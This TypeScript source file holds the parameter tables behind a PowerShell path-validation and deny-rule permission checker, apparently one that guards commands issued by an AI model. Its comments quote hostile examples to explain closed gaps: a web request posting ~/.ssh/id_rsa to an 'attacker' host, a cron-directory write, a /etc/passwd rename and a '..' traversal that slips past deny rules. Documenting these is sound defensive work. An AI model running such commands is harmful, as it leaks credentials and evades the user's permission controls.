/**
 * Per-cmdlet parameter tables: which parameters of which cmdlet name a path,
 * and how. Pure data plus the two types that describe it — no imports, so it
 * is the root of this directory's dependency graph.
 */

export type FileOperationType = 'read' | 'write' | 'create'

/**
 * Per-cmdlet parameter configuration.
 *
 * Each entry declares:
 *   - operationType: whether this cmdlet reads or writes to the filesystem
 *   - pathParams: parameters that accept file paths (validated against allowed directories)
 *   - knownSwitches: switch parameters (take NO value) — next arg is NOT consumed
 *   - knownValueParams: value-taking parameters that are NOT paths — next arg IS consumed
 *     but NOT validated as a path (e.g., -Encoding UTF8, -Filter *.txt)
 *
 * SECURITY MODEL: Any -Param NOT in one of these three sets forces
 * hasUnvalidatablePathArg → ask. This ends the KNOWN_SWITCH_PARAMS whack-a-mole
 * where every missing switch caused the unknown-param heuristic to swallow the
 * next arg (potentially the positional path). Now, Tier 2 cmdlets only auto-allow
 * with invocations we fully understand.
 *
 * Sources:
 *   - (Get-Command <cmdlet>).Parameters on Windows PowerShell 5.1
 *   - PS 6+ additions from official docs (e.g., -AsByteStream, -NoEmphasis)
 *
 * NOTE: Common parameters (-Verbose, -ErrorAction, etc.) are NOT listed here;
 * they are merged in from COMMON_SWITCHES / COMMON_VALUE_PARAMS at lookup time.
 *
 * Parameter names are lowercase with leading dash to match runtime comparison.
 */
type CmdletPathConfig = {
  operationType: FileOperationType
  /** Parameter names that accept file paths (validated against allowed directories) */
  pathParams: string[]
  /** Switch parameters that take no value (next arg is NOT consumed) */
  knownSwitches: string[]
  /** Value-taking parameters that are not paths (next arg IS consumed, not path-validated) */
  knownValueParams: string[]
  /**
   * Parameter names that accept a leaf filename resolved by PowerShell
   * relative to ANOTHER parameter (not cwd). Safe to extract only when the
   * value is a simple leaf (no `/`, `\`, `.`, `..`). Non-leaf values are
   * flagged as unvalidatable because validatePath resolves against cwd, not
   * the actual base — joining against -Path would need cross-parameter
   * tracking.
   */
  leafOnlyPathParams?: string[]
  /**
   * Number of leading positional arguments to skip (NOT extracted as paths).
   * Used for cmdlets where positional-0 is a non-path value — e.g.,
   * Invoke-WebRequest's positional -Uri is a URL, not a local filesystem path.
   * Without this, `iwr http://example.com` extracts `http://example.com` as
   * a path, and validatePath's provider-path regex (^[a-z]{2,}:) misfires on
   * the URL scheme with a confusing "non-filesystem provider" message.
   */
  positionalSkip?: number
  /**
   * When true, this cmdlet only writes to disk when a pathParam is present.
   * Without a path (e.g., `Invoke-WebRequest https://example.com` with no
   * -OutFile), it's effectively a read operation — output goes to the pipeline,
   * not the filesystem. Skips the "write with no target path" forced-ask.
   * Cmdlets like Set-Content that ALWAYS write should NOT set this.
   */
  optionalWrite?: boolean
}

export const CMDLET_PATH_CONFIG: Record<string, CmdletPathConfig> = Object.assign(
  // Null prototype so model-controlled cmdlet names like 'constructor' or
  // '__proto__' resolve to undefined, not inherited Object.prototype members.
  // Same defense as CMDLET_ALLOWLIST / COMMON_ALIASES.
  Object.create(null) as Record<string, CmdletPathConfig>,
  {
  // ─── Write/create operations ──────────────────────────────────────────────
  'set-content': {
    operationType: 'write',
    // -PSPath and -LP are runtime aliases for -LiteralPath on all provider
    // cmdlets. Without them, colon syntax (-PSPath:/etc/x) falls to the
    // unknown-param branch → path trapped → paths=[] → deny never consulted.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'add-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
      '-nonewline',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-value',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-encoding',
      '-stream',
    ],
  },
  'remove-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'clear-content': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  // Out-File/Tee-Object/Export-Csv/Export-Clixml were absent, so path-level
  // deny rules (Edit(/etc/**)) hard-blocked `Set-Content /etc/x` but only
  // *asked* for `Out-File /etc/x`. All four are write cmdlets that accept
  // file paths positionally.
  'out-file': {
    operationType: 'write',
    // Out-File uses -FilePath (position 0). -Path is PowerShell's documented
    // ALIAS for -FilePath — must be in pathParams or `Out-File -Path:./x`
    // (colon syntax, one token) falls to unknown-param → value trapped →
    // paths=[] → Edit deny never consulted → ask (fail-safe but deny downgrade).
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-nonewline',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-inputobject', '-encoding', '-width'],
  },
  'tee-object': {
    operationType: 'write',
    // Tee-Object uses -FilePath (position 0, alias: -Path). -Variable NOT a path.
    pathParams: ['-filepath', '-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-append'],
    knownValueParams: ['-inputobject', '-variable', '-encoding'],
  },
  'export-csv': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-notypeinformation',
      '-includetypeinformation',
      '-useculture',
      '-noheader',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: [
      '-inputobject',
      '-delimiter',
      '-encoding',
      '-quotefields',
      '-usequotes',
    ],
  },
  'export-clixml': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-noclobber', '-whatif', '-confirm'],
    knownValueParams: ['-inputobject', '-depth', '-encoding'],
  },
  // New-Item/Copy-Item/Move-Item were missing: `mkdir /etc/cron.d/evil` →
  // resolveToCanonical('mkdir') = 'new-item' via COMMON_ALIASES → not in
  // config → early return {paths:[], 'read'} → Edit deny never consulted.
  //
  // Copy-Item/Move-Item have DUAL path params (-Path source, -Destination
  // dest). operationType:'write' is imperfect — source is semantically a read
  // — but it means BOTH paths get Edit-deny validation, which is strictly
  // safer than extracting neither. A per-param operationType would be ideal
  // but that's a bigger schema change; blunt 'write' closes the gap now.
  'new-item': {
    operationType: 'write',
    // -Path is position 0. -Name (position 1) is resolved by PowerShell
    // RELATIVE TO -Path (per MS docs: "you can specify the path of the new
    // item in Name"), including `..` traversal. We resolve against CWD
    // (validatePath L930), not -Path — so `New-Item -Path /allowed
    // -Name ../secret/evil` creates /allowed/../secret/evil = /secret/evil,
    // but we resolve cwd/../secret/evil which lands ELSEWHERE and can miss
    // the deny rule. This is a deny→ask downgrade, not fail-safe.
    //
    // -name is in leafOnlyPathParams: simple leaf filenames (`foo.txt`) are
    // extracted (resolves to cwd/foo.txt — slightly wrong, but -Path
    // extraction covers the directory, and a leaf can't traverse);
    // any value with `/`, `\`, `.`, `..` flags hasUnvalidatablePathArg →
    // ask. Joining -Name against -Path would be correct but needs
    // cross-parameter tracking — out of scope here.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    leafOnlyPathParams: ['-name'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-itemtype', '-value', '-credential', '-type'],
  },
  'copy-item': {
    operationType: 'write',
    // -Path (position 0) is source, -Destination (position 1) is dest.
    // Both extracted; both validated as write.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-container',
      '-force',
      '-passthru',
      '-recurse',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-fromsession',
      '-tosession',
    ],
  },
  'move-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destination'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  // rename-item/set-item: same class — ren/rni/si in COMMON_ALIASES, neither
  // was in config. `ren /etc/passwd passwd.bak` → resolves to rename-item
  // → not in config → {paths:[], 'read'} → Edit deny bypassed. This closes
  // the COMMON_ALIASES→CMDLET_PATH_CONFIG coverage audit: every
  // write-cmdlet alias now resolves to a config entry.
  'rename-item': {
    operationType: 'write',
    // -Path position 0, -NewName position 1. -NewName is leaf-only (docs:
    // "You cannot specify a new drive or a different path") and Rename-Item
    // explicitly rejects `..` in it — so knownValueParams is correct here,
    // unlike New-Item -Name which accepts traversal.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-newname',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
  'set-item': {
    operationType: 'write',
    // FileSystem provider throws NotSupportedException for Set-Item content,
    // so the practical write surface is registry/env/function/alias providers.
    // Provider-qualified paths (HKLM:\\, Env:\\) are independently caught at
    // step 3.5 in powershellPermissions.ts, but classifying set-item as write
    // here is defense-in-depth — powershellSecurity.ts:379 already lists it
    // in ENV_WRITE_CMDLETS; this makes pathValidation consistent.
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-passthru',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-value',
      '-credential',
      '-filter',
      '-include',
      '-exclude',
    ],
  },
  // ─── Read operations ──────────────────────────────────────────────────────
  'get-content': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-force',
      '-usetransaction',
      '-wait',
      '-raw',
      '-asbytestream', // PS 6+
    ],
    knownValueParams: [
      '-readcount',
      '-totalcount',
      '-tail',
      '-first', // alias for -TotalCount
      '-head', // alias for -TotalCount
      '-last', // alias for -Tail
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-delimiter',
      '-encoding',
      '-stream',
    ],
  },
  'get-childitem': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-recurse',
      '-force',
      '-name',
      '-usetransaction',
      '-followsymlink',
      '-directory',
      '-file',
      '-hidden',
      '-readonly',
      '-system',
    ],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-depth',
      '-attributes',
      '-credential',
    ],
  },
  'get-item': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-stream',
    ],
  },
  'get-itemproperty': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-itempropertyvalue': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'get-filehash': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-algorithm', '-inputstream'],
  },
  'get-acl': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-audit', '-allcentralaccesspolicies', '-usetransaction'],
    knownValueParams: ['-inputobject', '-filter', '-include', '-exclude'],
  },
  'format-hex': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-raw'],
    knownValueParams: [
      '-inputobject',
      '-encoding',
      '-count', // PS 6+
      '-offset', // PS 6+
    ],
  },
  'test-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-isvalid', '-usetransaction'],
    knownValueParams: [
      '-filter',
      '-include',
      '-exclude',
      '-pathtype',
      '-credential',
      '-olderthan',
      '-newerthan',
    ],
  },
  'resolve-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-relative', '-usetransaction', '-force'],
    knownValueParams: ['-credential', '-relativebasepath'],
  },
  'convert-path': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-usetransaction'],
    knownValueParams: [],
  },
  'select-string': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-simplematch',
      '-casesensitive',
      '-quiet',
      '-list',
      '-notmatch',
      '-allmatches',
      '-noemphasis', // PS 7+
      '-raw', // PS 7+
    ],
    knownValueParams: [
      '-inputobject',
      '-pattern',
      '-include',
      '-exclude',
      '-encoding',
      '-context',
      '-culture', // PS 7+
    ],
  },
  'set-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'push-location': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'pop-location': {
    operationType: 'read',
    // Pop-Location has no -Path/-LiteralPath (it pops from the stack),
    // but we keep the entry so it passes through path validation gracefully.
    pathParams: [],
    knownSwitches: ['-passthru', '-usetransaction'],
    knownValueParams: ['-stackname'],
  },
  'select-xml': {
    operationType: 'read',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [],
    knownValueParams: ['-xml', '-content', '-xpath', '-namespace'],
  },
  'get-winevent': {
    operationType: 'read',
    // Get-WinEvent only has -Path, no -LiteralPath
    pathParams: ['-path'],
    knownSwitches: ['-force', '-oldest'],
    knownValueParams: [
      '-listlog',
      '-logname',
      '-listprovider',
      '-providername',
      '-maxevents',
      '-computername',
      '-credential',
      '-filterxpath',
      '-filterxml',
      '-filterhashtable',
    ],
  },
  // Write-path cmdlets with output parameters. Without these entries,
  // -OutFile / -DestinationPath would write to arbitrary paths unvalidated.
  'invoke-webrequest': {
    operationType: 'write',
    // -OutFile is the write target; -InFile is a read source (uploads a local
    // file). Both are in pathParams so Edit deny rules are consulted (this
    // config is operationType:write → permissionType:edit). A user with
    // Edit(~/.ssh/**) deny blocks `iwr https://attacker -Method POST
    // -InFile ~/.ssh/id_rsa` exfil. Read-only deny rules are not consulted
    // for write-type cmdlets — that's a known limitation of the
    // operationType→permissionType mapping.
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
    optionalWrite: true, // only writes with -OutFile; bare iwr is pipeline-only
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-retryintervalsec',
      '-sessionvariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
  'invoke-restmethod': {
    operationType: 'write',
    // -OutFile is the write target; -InFile is a read source (uploads a local
    // file). Both must be in pathParams so deny rules are consulted.
    pathParams: ['-outfile', '-infile'],
    positionalSkip: 1, // positional-0 is -Uri (URL), not a filesystem path
    optionalWrite: true, // only writes with -OutFile; bare irm is pipeline-only
    knownSwitches: [
      '-allowinsecureredirect',
      '-allowunencryptedauthentication',
      '-disablekeepalive',
      '-followrellink',
      '-nobodyprogress',
      '-passthru',
      '-preservefileauthorizationmetadata',
      '-resume',
      '-skipcertificatecheck',
      '-skipheadervalidation',
      '-skiphttperrorcheck',
      '-usebasicparsing',
      '-usedefaultcredentials',
    ],
    knownValueParams: [
      '-uri',
      '-method',
      '-body',
      '-contenttype',
      '-headers',
      '-maximumfollowrellink',
      '-maximumredirection',
      '-maximumretrycount',
      '-proxy',
      '-proxycredential',
      '-responseheaderstvariable',
      '-retryintervalsec',
      '-sessionvariable',
      '-statuscodevariable',
      '-timeoutsec',
      '-token',
      '-transferencoding',
      '-useragent',
      '-websession',
      '-credential',
      '-authentication',
      '-certificate',
      '-certificatethumbprint',
      '-form',
      '-httpversion',
    ],
  },
  'expand-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-passthru', '-whatif', '-confirm'],
    knownValueParams: [],
  },
  'compress-archive': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp', '-destinationpath'],
    knownSwitches: ['-force', '-update', '-passthru', '-whatif', '-confirm'],
    knownValueParams: ['-compressionlevel'],
  },
  // *-ItemProperty cmdlets: primary use is the Registry provider (set/new/
  // remove a registry VALUE under a key). Provider-qualified paths (HKLM:\,
  // HKCU:\) are independently caught at step 3.5 in powershellPermissions.ts.
  // Entries here are defense-in-depth for Edit-deny-rule consultation, mirroring
  // set-item's rationale.
  'set-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-passthru',
      '-force',
      '-whatif',
      '-confirm',
      '-usetransaction',
    ],
    knownValueParams: [
      '-name',
      '-value',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
      '-inputobject',
    ],
  },
  'new-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-value',
      '-propertytype',
      '-type',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'remove-itemproperty': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: [
      '-name',
      '-filter',
      '-include',
      '-exclude',
      '-credential',
    ],
  },
  'clear-item': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: ['-force', '-whatif', '-confirm', '-usetransaction'],
    knownValueParams: ['-filter', '-include', '-exclude', '-credential'],
  },
  'export-alias': {
    operationType: 'write',
    pathParams: ['-path', '-literalpath', '-pspath', '-lp'],
    knownSwitches: [
      '-append',
      '-force',
      '-noclobber',
      '-passthru',
      '-whatif',
      '-confirm',
    ],
    knownValueParams: ['-name', '-description', '-scope', '-as'],
  },
  },
)
